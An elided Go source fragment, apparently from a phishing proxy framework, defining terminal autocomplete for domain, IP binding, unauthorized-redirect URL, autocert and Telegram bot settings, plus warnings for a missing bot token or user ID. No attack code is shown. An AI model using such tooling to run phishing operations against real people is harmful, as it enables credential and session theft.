...
func (t *Terminal) createHelp() {
	...
	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
			...
			readline.PcItem("telegram", readline.PcItem("bot", readline.PcItem("token")), readline.PcItem("user", readline.PcItem("id")), readline.PcItem("test"))))
...
func (t *Terminal) handleCheckTelegram(args []string) error {
	...
	if botToken == "" || userID == "" {
		...
		if botToken == "" {
			log.Warning("- Telegram bot token is not set. Use 'config telegram bot token <token>' to set it.")
		}
		if userID == "" {
			log.Warning("- Telegram user ID is not set. Use 'config telegram user id <user_id>' to set it.")
		}
